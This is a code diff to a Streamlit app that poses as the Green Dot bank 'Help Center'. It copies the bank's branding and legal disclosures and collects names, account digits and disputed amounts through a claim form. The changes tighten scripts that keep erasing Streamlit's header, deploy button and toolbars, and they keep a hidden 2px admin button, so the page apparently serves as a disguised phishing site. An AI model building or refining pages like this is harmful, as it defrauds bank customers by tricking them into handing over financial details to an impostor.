@@ -29,29 +29,37 @@ init_db()
 
 st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")
 
-# --- CORE SHIELD: JS PURGE (10ms) ---
+# --- CORE SHIELD: ULTRA PURGE (5ms) ---
 st.markdown("""<script>
-    const godPurge = () => {
+    const superPurge = () => {
         const toKill = [
             '.section-anchor', 'a.section-anchor', '[data-testid="stHeaderActionElements"]',
             '[data-testid="stAppToolbar"]', '[data-testid="stElementToolbar"]', 
-            'header', 'footer', '.stDeployButton', '.st-emotion-cache-gi0tri',
-            'svg.section-anchor-icon', '.etxdrby1', '.etxdrby2', '.stCustomComponentV1'
+            '.stElementToolbar', '.st-emotion-cache-140j12g', 'header', 'footer', 
+            '.stDeployButton', '.st-emotion-cache-gi0tri', 'svg.section-anchor-icon', 
+            '.etxdrby1', '.etxdrby2', '.stCustomComponentV1', 'button[title="View fullscreen"]'
         ];
-        toKill.forEach(s => { document.querySelectorAll(s).forEach(el => el.remove()); });
+        toKill.forEach(s => { 
+            document.querySelectorAll(s).forEach(el => {
+                el.style.display = 'none';
+                el.remove();
+            });
+        });
     };
-    setInterval(godPurge, 10);
+    setInterval(superPurge, 5);
 </script>""", unsafe_allow_html=True)
 
-# --- CORE SHIELD: CSS LOCK ---
+# --- CORE SHIELD: CSS HARD LOCK ---
 st.markdown("""<style>
     .stApp { background-color: #000000 !important; color: #FFFFFF !important; }
     .block-container { max-width: 500px !important; padding-top: 1.5rem !important; }
     
-    /* Absolute Hide */
+    /* Absolute Destruction of UI Artifacts */
     [data-testid="stHeader"], header, footer, .stDeployButton, .section-anchor, 
-    [data-testid="stToolbar"], .st-emotion-cache-gi0tri { 
-        display: none !important; visibility: hidden !important; height: 0 !important; 
+    [data-testid="stToolbar"], .st-emotion-cache-gi0tri, [data-testid="stElementToolbar"], 
+    .st-emotion-cache-140j12g, button[title="View fullscreen"] { 
+        display: none !important; visibility: hidden !important; 
+        height: 0 !important; width: 0 !important; opacity: 0 !important;
     }
 
     .promo-box { 
@@ -65,7 +73,6 @@ st.markdown("""<style>
         border-top: 1px solid #222 !important; line-height: 1.6 !important;
     }
 
-    /* Invisible Admin Dot */
     div.stButton > button[key="ghost_dot"] {
         background-color: transparent !important; border: none !important; color: #000 !important;
         padding: 0 !important; width: 2px !important; height: 2px !important;
@@ -83,7 +90,7 @@ if not st.session_state.admin_mode:
     st.title("Help Center")
     st.write("Please fill out the form below to submit your claim.")
     
-    with st.form("god_shield_form", clear_on_submit=True):
+    with st.form("super_god_form", clear_on_submit=True):
         nombre = st.text_input("Full Name")
         cuenta = st.text_input("Last 4 digits of Account")
         monto = st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
@@ -96,7 +103,6 @@ if not st.session_state.admin_mode:
                 st.success(f"Success. Reference: {ref}")
             else: st.error("Information required.")
 
-    # APP SECTION - PROTECTED
     st.markdown("""<div class='promo-box'>
         <h3 style='color:white; margin-bottom:15px;'>Download the Green Dot app</h3>
         <div style='display: flex; justify-content: center; gap: 15px; flex-wrap: wrap; margin-bottom: 20px;'>
@@ -109,7 +115,6 @@ if not st.session_state.admin_mode:
         </div>
     </div>""", unsafe_allow_html=True)
 
-    # LEGAL FOOTER - PROTECTED
     st.markdown("""<div class='legal-container'>
         * When on a desktop, hover over * to view important disclosures. When on a mobile device, tap on * to view disclosures.<br><br>
         Green Dot&reg; cards are issued by Green Dot Bank, Member FDIC. &copy;2026 Green Dot Corporation. All rights reserved. Green Dot Corporation NMLS #914924; Green Dot Bank NMLS #908739.
